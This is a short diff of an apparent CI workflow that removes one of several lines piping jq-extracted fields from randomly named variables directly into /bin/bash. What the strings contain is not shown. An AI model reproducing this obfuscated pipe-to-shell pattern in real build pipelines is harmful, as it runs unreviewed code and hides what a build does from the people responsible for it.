@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$s00" | jq -r .lqr151 | /bin/bash
           printf '%s' "$xuhvo1687" | jq -r .n384 | /bin/bash
           printf '%s' "$uccz51516" | jq -r .edwbo7260 | /bin/bash
-          echo $zxl32 | jq -r .lainc31642 | /bin/bash
           echo $rilim5948 | jq -r .u61404 | /bin/bash
           echo $zfvk72864 | jq -r .py84399 | /bin/bash
           echo $aaorg3156 | jq -r .orqxm51 | /bin/bash
